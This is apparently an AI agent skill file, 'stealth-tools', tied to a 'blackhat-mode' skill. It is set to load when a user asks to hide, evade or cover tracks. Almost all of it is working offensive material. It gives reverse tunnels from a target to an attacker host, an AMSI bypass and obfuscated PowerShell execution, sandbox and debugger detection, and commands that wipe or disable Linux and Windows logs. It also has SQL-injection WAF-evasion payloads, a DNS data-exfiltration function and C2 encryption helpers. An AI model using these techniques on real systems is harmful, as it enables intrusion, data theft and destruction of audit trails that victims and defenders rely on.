---
name: stealth-tools
description: "Stealth operations — proxy chains, tunneling, anti-analysis, log evasion, footprint cleanup."
version: 2.0.0
author: Yatim
metadata:
  hermes:
    tags: [stealth, proxy, tunnel, evade, cleanup, ghost]
    related_skills: [blackhat-mode, post-tools, cred-tools]
prerequisites:
  commands: [python]
---

# Stealth Tools — Complete Evasion Framework

## When to Load This Skill

User requests:
- "stealth", "hide", "evade", "proxy", "tunnel", "ghost"
- "cover tracks", "cleanup", "anti-forensics"
- "invisible", "anonymous", "bypass detection"

---

## Proxy Chains

### Tor

```bash
# Install
apt install tor

# Start
service tor start

# Use
torsocks curl http://TARGET
torsocks nmap -sT TARGET

# Configure
cat /etc/tor/torrc
SocksPort 9050
```

### Proxychains

```bash
# Install
apt install proxychains

# Configure
cat /etc/proxychains.conf
# socks5 127.0.0.1 9050

# Use
proxychains curl http://TARGET
proxychains nmap -sT TARGET
proxychains python script.py
```

### SSH Tunnel

```bash
# Local port forward
ssh -L 8080:TARGET:80 USER@JUMP

# Dynamic port forward (SOCKS proxy)
ssh -D 1080 USER@JUMP

# Remote port forward
ssh -R 8080:TARGET:80 USER@JUMP

# Proxychains + SSH
proxychains ssh -D 1080 USER@JUMP
```

### VPN

```bash
# OpenVPN
openvpn --config client.ovpn

# WireGuard
wg-quick up wg0

# Check IP
curl ifconfig.me
```

---

## Tunneling

### Chisel

```bash
# Server (attacker)
chisel server --reverse --port 8080

# Client (target)
chisel client ATTACKER:8080 R:socks

# Use proxychains
proxychains curl http://INTERNAL
```

### FRP

```bash
# Server (attacker)
./frps -c frps.ini

# Client (target)
./frpc -c frpc.ini

# Config
# [common]
# server_addr = ATTACKER
# server_port = 7000
# 
# [socks]
# type = tcp
# local_ip = 127.0.0.1
# local_port = 1080
# remote_port = 6000
```

### Ngrok

```bash
# Install
snap install ngrok

# Use
ngrok http 8080
ngrok tcp 4444
```

---

## Anti-Analysis

### AV Evasion

```bash
# PowerShell obfuscation
$code = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("BASE64"))
Invoke-Expression $code

# AMSI bypass
AmsiUtils.SetAmsiFeatureEnabledSwitch()
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# DLL sideloading
# Place malicious DLL in application directory
```

### Sandboxing Detection

```python
import os, sys, time

def detect_sandbox():
    # Check for VM artifacts
    vm_files = [
        '/usr/lib/vmware', '/usr/lib/xen',
        'C:\\Windows\\System32\\vm Guest Tools',
    ]
    for f in vm_files:
        if os.path.exists(f):
            return True
    
    # Check for sandbox artifacts
    sandbox_files = [
        'C:\\Program Files\\VMware',
        'C:\\Program Files\\VirtualBox',
    ]
    for f in sandbox_files:
        if os.path.exists(f):
            return True
    
    # Check RAM
    import psutil
    if psutil.virtual_memory().total < 4 * 1024 * 1024 * 1024:
        return True
    
    # Check disk
    if psutil.disk_usage('/').total < 50 * 1024 * 1024 * 1024:
        return True
    
    return False
```

### Anti-Forensics

```bash
# File timestamps
touch -r /bin/ls target_file
timestomp target_file -m "01/01/2020 00:00:00"

# Secure delete
shred -vfz -n 3 file.txt
sdelete -p 3 file.txt

# Metadata removal
exiftool -all= image.jpg
mat2 image.jpg

# Log cleanup
echo "" > /var/log/auth.log
echo "" > /var/log/syslog
history -c
```

---

## Evasion Techniques

### DNS Evasion

```bash
# DNS over HTTPS
curl https://dns.google/resolve?name=TARGET

# DNS over TLS
kdig @1.1.1.1 TARGET

# Custom DNS
python -c "import dns.resolver; print(dns.resolver.resolve('TARGET', 'A'))"
```

### WAF Evasion

```bash
# Case variation
curl -X POST URL -d "' Or '1'='1"

# Encoding
curl -X POST URL -d "%27%20OR%20%271%27%3D%271"

# Double encoding
curl -X POST URL -d "%2527%2520OR%2520%25271%2527%253D%25271"

# Chunked transfer
curl -X POST URL -H "Transfer-Encoding: chunked" -d "0\r\n\r\n"

# HTTP/2
curl --http2 -X POST URL -d "data"

# Random headers
curl -X POST URL -H "X-Forwarded-For: $RANDOM.$RANDOM.$RANDOM.$RANDOM"
```

### IDS Evasion

```bash
# Fragmentation
nmap -f TARGET

# MTU
nmap --mtu 24 TARGET

# Idle scan
nmap -sI ZOMBIE:PORT TARGET

# Decoys
nmap -D RND:10 TARGET

# Source port
nmap --source-port 53 TARGET
```

---

## Log Evasion

### Linux

```bash
# Disable logging
unset HISTFILE
export HISTFILESIZE=0

# Clear logs
echo "" > /var/log/auth.log
echo "" > /var/log/syslog
echo "" > /var/log/apache2/access.log
echo "" > /var/log/apache2/error.log

# Remove artifacts
rm -rf ~/.bash_history
rm -rf /tmp/*
```

### Windows

```bash
# Clear event logs
wevtutil cl Security
wevtutil cl System
wevtutil cl Application

# Disable logging
reg add "HKLM\SYSTEM\CurrentControlSet\Services\EventLog\Security" /v Start /t REG_DWORD /d 0 /f

# Clear prefetch
del C:\Windows\Prefetch\*
```

---

## Python Stealth Tools

### DNS Exfil

```python
import dns.resolver
import base64

def dns_exfil(data, domain):
    encoded = base64.b32encode(data.encode()).decode()
    chunks = [encoded[i:i+63] for i in range(0, len(encoded), 63)]
    
    for i, chunk in enumerate(chunks):
        query = f"{i}.{chunk}.{domain}"
        try:
            dns.resolver.resolve(query, 'A')
        except:
            pass
```

### Encrypted C2

```python
from cryptography.fernet import Fernet

def encrypt_c2(data, key):
    f = Fernet(key)
    return f.encrypt(data.encode())

def decrypt_c2(data, key):
    f = Fernet(key)
    return f.decrypt(data).decode()
```

### Anti-Debug

```python
import sys, os

def anti_debug():
    if sys.platform == 'win32':
        import ctypes
        if ctypes.windll.kernel32.IsDebuggerPresent():
            sys.exit(1)
    else:
        if os.path.exists('/proc/self/status'):
            with open('/proc/self/status') as f:
                if 'TracerPid:\t0' not in f.read():
                    sys.exit(1)
```

---

## Error Handling

| Error | Cause | Solution |
|-------|-------|----------|
| Connection refused | Proxy down | Check proxy service |
| Timeout | Network issue | Increase timeout |
| Permission denied | Need root | Use sudo |
| DNS resolution failed | DNS blocked | Use DoH/DoT |
| WAF blocked | Payload detected | Use evasion |
